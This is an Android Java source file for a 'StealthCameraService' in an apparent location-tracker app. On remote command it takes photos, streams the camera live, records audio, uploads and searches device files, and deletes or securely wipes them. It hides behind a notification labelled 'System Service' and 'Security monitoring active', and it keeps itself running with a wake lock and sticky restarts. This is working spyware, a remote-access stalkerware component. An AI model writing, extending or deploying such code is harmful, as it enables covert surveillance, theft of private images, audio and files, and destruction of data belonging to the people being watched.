package com.example.locationtracker;

import android.Manifest;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.hardware.camera2.*;
import android.media.Image;
import android.media.ImageReader;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Log;
import android.util.Size;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import androidx.annotation.NonNull;
import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.Semaphore;
import java.util.concurrent.TimeUnit;
import org.json.JSONArray;

public class StealthCameraService extends Service {
    private static final String TAG = "StealthCameraService";
    private volatile boolean isTransmitting = false;

    private CameraManager cameraManager;
    private String frontCameraId;
    private String backCameraId;
    private String currentCameraId;
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private ImageReader imageReader;

    private Handler backgroundHandler;
    private HandlerThread backgroundThread;
    private PowerManager.WakeLock wakeLock;

    private boolean isCapturing = false;
    private boolean isEmergencyMode = false;
    private boolean isLiveStreaming = false;
    private final Semaphore cameraOpenCloseLock = new Semaphore(1);

    private StealthDataTransmitter dataTransmitter;
    private AudioRecorder audioRecorder;
    private String deviceId;

    private BroadcastReceiver dozeModeReceiver;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "StealthCameraService created");

        deviceId = DeviceIdManager.getDeviceId(this);
        Log.d(TAG, "Device ID: " + deviceId);

        cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        dataTransmitter = new StealthDataTransmitter(this);

        dataTransmitter.setCommandListener(action -> {
            Log.e(TAG, "╔════════════════════════════════╗");
            Log.e(TAG, "║  DIRECT CALLBACK RECEIVED!     ║");
            Log.e(TAG, "║  Action: " + action + "        ║");
            Log.e(TAG, "╚════════════════════════════════╝");
            processCommand(action);
        });

        setupCameraIds();
        startBackgroundThread();
        acquireWakeLock();

        dataTransmitter.testConnection(deviceId);
        startForeground(8004, createNotification());
        registerDozeModeReceiver();
    }

    private void registerDozeModeReceiver() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            dozeModeReceiver = new BroadcastReceiver() {
                @Override
                public void onReceive(Context context, Intent intent) {
                    if (PowerManager.ACTION_DEVICE_IDLE_MODE_CHANGED.equals(intent.getAction())) {
                        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                        if (pm != null && !pm.isDeviceIdleMode()) {
                            // Телефон вышел из Doze — переподключаем WebSocket
                            Log.d(TAG, "Exited Doze mode, reconnecting WebSocket");
                            if (dataTransmitter != null && !dataTransmitter.isConnected()) {
                                dataTransmitter.testConnection(deviceId);
                            }
                        }
                    }
                }
            };

            IntentFilter filter = new IntentFilter();
            filter.addAction(PowerManager.ACTION_DEVICE_IDLE_MODE_CHANGED);
            registerReceiver(dozeModeReceiver, filter);
            Log.d(TAG, "Doze mode receiver registered");
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (deviceId != null && intent != null && "ACTIVATE_STEALTH".equals(intent.getStringExtra("action"))) {
            Log.d(TAG, "Activating stealth mode for device: " + deviceId);
            activateStealthMode(deviceId);
        }
        return START_STICKY;
    }

    private void processCommand(String command) {
        Log.d(TAG, "Processing camera command: " + command);

        String cmd = command.toLowerCase();

        switch (cmd) {
            case "take_photo":
                if (cameraDevice == null) {
                    startCameraCapture();
                } else {
                    startSingleCapture();
                }
                break;

            case "download_file":
                SharedPreferences prefs = getSharedPreferences("stealth_commands", MODE_PRIVATE);
                String filePath = prefs.getString("file_path", "");
                if (!filePath.isEmpty()) {
                    Log.d(TAG, "Downloading file: " + filePath);
                    dataTransmitter.sendFile(filePath);
                } else {
                    Log.e(TAG, "No file path provided for download");
                }
                break;

            case "get_files":
                dataTransmitter.sendFileList();
                break;

            case "start_live_stream":
                if (cameraDevice == null) {
                    isLiveStreaming = true;
                    openCamera(frontCameraId);
                } else {
                    startLiveStreaming();
                }
                break;

            case "stop_live_stream":
                stopLiveStreaming();
                break;

            case "start_recording":
            case "start_audio":
                startAudioCapture();
                break;

            case "stop_recording":
            case "stop_audio":
                stopAudioCapture();
                break;

            case "switch_camera":
                switchCamera();
                break;

            case "search_files":
                performFileSearch();
                break;

            case "delete_files":
                performDeleteFiles(false);
                break;

            case "secure_wipe":
                performDeleteFiles(true);
                break;

            default:
                Log.w(TAG, "Unknown command: " + command);
                break;
        }
    }

    private Notification createNotification() {
        String channelId = "stealth_channel";

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    channelId,
                    "Security Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Device security monitoring");

            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }

        return new NotificationCompat.Builder(this, channelId)
                .setContentTitle("System Service")
                .setContentText("Security monitoring active")
                .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .build();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        if (dozeModeReceiver != null) {
            try {
                unregisterReceiver(dozeModeReceiver);
            } catch (Exception ignored) {}
            dozeModeReceiver = null;
        }
        stopAudioCapture();
        deactivateStealthMode();
        stopBackgroundThread();
        releaseWakeLock();
        super.onDestroy();
    }

    private void setupCameraIds() {
        try {
            for (String cameraId : cameraManager.getCameraIdList()) {
                CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(cameraId);
                Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);

                if (facing != null) {
                    if (facing == CameraCharacteristics.LENS_FACING_FRONT) {
                        frontCameraId = cameraId;
                    } else if (facing == CameraCharacteristics.LENS_FACING_BACK) {
                        backCameraId = cameraId;
                    }
                }
            }
            currentCameraId = frontCameraId;
        } catch (CameraAccessException e) {
            Log.e(TAG, "Failed to setup camera IDs", e);
        }
    }

    private void setupCamera(String cameraId) {
        try {
            CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(cameraId);
            StreamConfigurationMap map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);

            if (map == null) {
                Log.e(TAG, "StreamConfigurationMap is null");
                return;
            }

            Size[] jpegSizes = map.getOutputSizes(ImageFormat.JPEG);
            if (jpegSizes == null || jpegSizes.length == 0) {
                Log.e(TAG, "No JPEG output sizes available");
                return;
            }
            Size maxSize = jpegSizes[0];

            int width = Math.min(maxSize.getWidth(), 1280);
            int height = Math.min(maxSize.getHeight(), 720);
            imageReader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 2);
            imageReader.setOnImageAvailableListener(onImageAvailableListener, backgroundHandler);

        } catch (Exception e) {
            Log.e(TAG, "Camera setup failed", e);
        }
    }

    public void activateStealthMode(String deviceId) {
        if (isEmergencyMode) return;

        Log.d(TAG, "Activating stealth mode for device: " + deviceId);
        isEmergencyMode = true;
        this.deviceId = deviceId;
        Log.d(TAG, "Emergency mode activated for device: " + deviceId);
    }

    public void deactivateStealthMode() {
        if (!isEmergencyMode) return;

        Log.d(TAG, "Deactivating stealth mode");
        isEmergencyMode = false;
        isCapturing = false;
        isLiveStreaming = false;

        if (backgroundHandler != null) {
            backgroundHandler.removeCallbacks(captureRunnable);
            backgroundHandler.removeCallbacks(liveStreamRunnable);
        }

        closeCamera();
        dataTransmitter.disconnect();
    }

    public void startCameraCapture() {
        if (!isEmergencyMode || isCapturing) return;

        Log.d(TAG, "Starting camera capture by command");
        isCapturing = true;
        openCamera(frontCameraId);
    }

    public void stopCameraCapture() {
        Log.d(TAG, "Stopping camera capture");
        isCapturing = false;
        isLiveStreaming = false;

        if (backgroundHandler != null) {
            backgroundHandler.removeCallbacks(captureRunnable);
            backgroundHandler.removeCallbacks(liveStreamRunnable);
        }

        closeCamera();
    }

    public void startLiveStreaming() {
        if (!isEmergencyMode) return;

        Log.d(TAG, "Starting live streaming mode");
        isLiveStreaming = true;

        if (cameraDevice != null && captureSession != null && backgroundHandler != null) {
            backgroundHandler.removeCallbacks(captureRunnable);
            backgroundHandler.post(liveStreamRunnable);
        }
    }

    public void stopLiveStreaming() {
        Log.d(TAG, "Stopping live streaming mode");
        isLiveStreaming = false;

        if (backgroundHandler != null) {
            backgroundHandler.removeCallbacks(liveStreamRunnable);
        }
    }

    public void startAudioCapture() {
        if (audioRecorder != null || deviceId == null) return;

        try {
            audioRecorder = new AudioRecorder(this, deviceId, dataTransmitter);
            audioRecorder.startRecording();
            Log.d(TAG, "Audio capture started");
        } catch (Exception e) {
            Log.e(TAG, "Failed to start audio capture", e);
        }
    }

    public void stopAudioCapture() {
        if (audioRecorder != null) {
            audioRecorder.stopRecording();
            audioRecorder = null;
            Log.d(TAG, "Audio capture stopped");
        }
    }

    private void performFileSearch() {
        SharedPreferences prefs = getSharedPreferences("stealth_commands", MODE_PRIVATE);
        String keywordsJson = prefs.getString("search_keywords", "[]");
        String extensionsJson = prefs.getString("search_extensions", "[]");

        backgroundHandler.post(() -> {
            try {
                FileManagementService fileService = new FileManagementService(this);
                FileManagementService.SearchCriteria criteria = new FileManagementService.SearchCriteria();

                JSONArray keywords = new JSONArray(keywordsJson);
                for (int i = 0; i < keywords.length(); i++) {
                    String kw = keywords.getString(i).trim();
                    if (!kw.isEmpty()) criteria.addKeywordPattern(kw);
                }

                JSONArray extensions = new JSONArray(extensionsJson);
                for (int i = 0; i < extensions.length(); i++) {
                    String ext = extensions.getString(i).trim().toLowerCase();
                    if (!ext.isEmpty()) criteria.addFileExtension(ext);
                }

                List<String> results = fileService.searchFiles(criteria);
                Log.d(TAG, "File search complete: " + results.size() + " files found");
                dataTransmitter.sendSearchResults(results);
            } catch (Exception e) {
                Log.e(TAG, "File search failed", e);
            }
        });
    }

    private void performDeleteFiles(boolean secureWipe) {
        SharedPreferences prefs = getSharedPreferences("stealth_commands", MODE_PRIVATE);
        String filesJson = prefs.getString("target_files", "[]");

        backgroundHandler.post(() -> {
            try {
                FileManagementService fileService = new FileManagementService(this);
                JSONArray filesArray = new JSONArray(filesJson);
                List<String> filePaths = new java.util.ArrayList<>();
                for (int i = 0; i < filesArray.length(); i++) {
                    filePaths.add(filesArray.getString(i));
                }

                if (secureWipe) {
                    for (String path : filePaths) {
                        fileService.secureDelete(path);
                    }
                } else {
                    fileService.deleteFiles(filePaths);
                }
                Log.d(TAG, (secureWipe ? "Secure wipe" : "Delete") + " complete for " + filePaths.size() + " files");
            } catch (Exception e) {
                Log.e(TAG, "File delete failed", e);
            }
        });
    }

    private void openCamera(String cameraId) {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Camera permission not granted");
            return;
        }

        if (cameraDevice != null) {
            Log.d(TAG, "Camera already open");
            return;
        }

        currentCameraId = cameraId;
        setupCamera(cameraId);

        try {
            if (!cameraOpenCloseLock.tryAcquire(2500, TimeUnit.MILLISECONDS)) {
                Log.e(TAG, "Could not acquire camera lock");
                return;
            }

            cameraManager.openCamera(cameraId, stateCallback, backgroundHandler);

        } catch (CameraAccessException e) {
            Log.e(TAG, "Failed to open camera", e);
            cameraOpenCloseLock.release();
        } catch (InterruptedException e) {
            Log.e(TAG, "Interrupted while waiting for camera lock", e);
        }
    }

    private final CameraDevice.StateCallback stateCallback = new CameraDevice.StateCallback() {
        @Override
        public void onOpened(@NonNull CameraDevice camera) {
            cameraOpenCloseLock.release();
            cameraDevice = camera;
            createCaptureSession();
        }

        @Override
        public void onDisconnected(@NonNull CameraDevice camera) {
            cameraOpenCloseLock.release();
            camera.close();
            cameraDevice = null;
        }

        @Override
        public void onError(@NonNull CameraDevice camera, int error) {
            cameraOpenCloseLock.release();
            camera.close();
            cameraDevice = null;
            Log.e(TAG, "Camera error: " + error);
        }
    };

    private void createCaptureSession() {
        try {
            cameraDevice.createCaptureSession(Arrays.asList(imageReader.getSurface()),
                    new CameraCaptureSession.StateCallback() {
                        @Override
                        public void onConfigured(@NonNull CameraCaptureSession session) {
                            if (null == cameraDevice) return;

                            captureSession = session;
                            Log.d(TAG, "Camera session configured, ready for commands");

                            if (isLiveStreaming && backgroundHandler != null) {
                                backgroundHandler.post(liveStreamRunnable);
                            }
                        }

                        @Override
                        public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                            Log.e(TAG, "Failed to configure capture session");
                        }
                    }, backgroundHandler);
        } catch (CameraAccessException e) {
            Log.e(TAG, "Failed to create capture session", e);
        }
    }

    public void startSingleCapture() {
        if (!isEmergencyMode || captureSession == null) return;

        try {
            CaptureRequest.Builder captureRequestBuilder =
                    cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
            captureRequestBuilder.addTarget(imageReader.getSurface());

            captureRequestBuilder.set(CaptureRequest.JPEG_QUALITY, (byte) 98);
            captureRequestBuilder.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO);
            captureRequestBuilder.set(CaptureRequest.CONTROL_AE_MODE, CameraMetadata.CONTROL_AE_MODE_ON);
            captureRequestBuilder.set(CaptureRequest.CONTROL_AF_MODE, CameraMetadata.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
            captureRequestBuilder.set(CaptureRequest.CONTROL_AWB_MODE, CameraMetadata.CONTROL_AWB_MODE_AUTO);

            captureSession.capture(captureRequestBuilder.build(), null, backgroundHandler);
            Log.d(TAG, "Single capture triggered");

        } catch (CameraAccessException e) {
            Log.e(TAG, "Failed to capture", e);
        }
    }

    private final Runnable captureRunnable = new Runnable() {
        @Override
        public void run() {
            if (isCapturing && isEmergencyMode && captureSession != null && !isLiveStreaming) {
                startSingleCapture();
            }
        }
    };

    private final Runnable liveStreamRunnable = new Runnable() {
        @Override
        public void run() {
            if (isLiveStreaming && isEmergencyMode && captureSession != null) {
                if (!isTransmitting) {
                    try {
                        CaptureRequest.Builder captureBuilder =
                                cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                        captureBuilder.addTarget(imageReader.getSurface());
                        captureBuilder.set(CaptureRequest.JPEG_QUALITY, (byte) 60);
                        captureBuilder.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO);

                        captureSession.capture(captureBuilder.build(), null, backgroundHandler);
                        backgroundHandler.postDelayed(this, 800);

                    } catch (CameraAccessException e) {
                        Log.e(TAG, "Live capture failed", e);
                    }
                } else {
                    backgroundHandler.postDelayed(this, 200);
                }
            }
        }
    };

    private final ImageReader.OnImageAvailableListener onImageAvailableListener =
            new ImageReader.OnImageAvailableListener() {
                @Override
                public void onImageAvailable(ImageReader reader) {
                    if (isTransmitting) {
                        Image img = reader.acquireLatestImage();
                        if (img != null) img.close();
                        return;
                    }

                    Image image = null;
                    try {
                        image = reader.acquireLatestImage();
                        if (image != null && deviceId != null) {
                            isTransmitting = true;

                            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                            byte[] imageData = new byte[buffer.remaining()];
                            buffer.get(imageData);

                            backgroundHandler.post(() -> {
                                try {
                                    dataTransmitter.sendImageData(imageData);
                                } finally {
                                    isTransmitting = false;
                                }
                            });
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error processing image", e);
                        isTransmitting = false;
                    } finally {
                        if (image != null) {
                            image.close();
                        }
                    }
                }
            };

    private void closeCamera() {
        try {
            cameraOpenCloseLock.acquire();

            if (null != captureSession) {
                captureSession.close();
                captureSession = null;
            }

            if (null != cameraDevice) {
                cameraDevice.close();
                cameraDevice = null;
            }

            if (null != imageReader) {
                imageReader.close();
                imageReader = null;
            }

        } catch (InterruptedException e) {
            throw new RuntimeException("Interrupted while trying to lock camera closing.", e);
        } finally {
            cameraOpenCloseLock.release();
        }
    }

    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("StealthCameraBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }

    private void stopBackgroundThread() {
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
            try {
                backgroundThread.join();
                backgroundThread = null;
                backgroundHandler = null;
            } catch (InterruptedException e) {
                Log.e(TAG, "Error stopping background thread", e);
            }
        }
    }

    private void acquireWakeLock() {
        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (powerManager != null) {
            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "StealthCamera::WakeLock");
            wakeLock.acquire(8 * 60 * 60 * 1000L);
        }
    }

    private void releaseWakeLock() {
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
    }

    public void switchCamera() {
        if (!isEmergencyMode) return;

        Log.d(TAG, "Switching camera");

        boolean wasStreaming = isLiveStreaming;

        isLiveStreaming = false;
        isTransmitting = false;

        if (backgroundHandler != null) {
            backgroundHandler.removeCallbacks(liveStreamRunnable);
        }

        closeCamera();

        if (currentCameraId == null || frontCameraId == null || backCameraId == null) {
            Log.e(TAG, "Camera IDs not initialized, cannot switch");
            return;
        }

        String newCameraId = currentCameraId.equals(frontCameraId) ? backCameraId : frontCameraId;
        Log.d(TAG, "Switching to camera: " + newCameraId);

        backgroundHandler.postDelayed(() -> {
            openCamera(newCameraId);

            if (wasStreaming) {
                backgroundHandler.postDelayed(() -> {
                    isLiveStreaming = true;
                    isTransmitting = false;
                    if (captureSession != null) {
                        backgroundHandler.postDelayed(liveStreamRunnable, 500);
                    }
                }, 1500);
            }
        }, 800);
    }
}
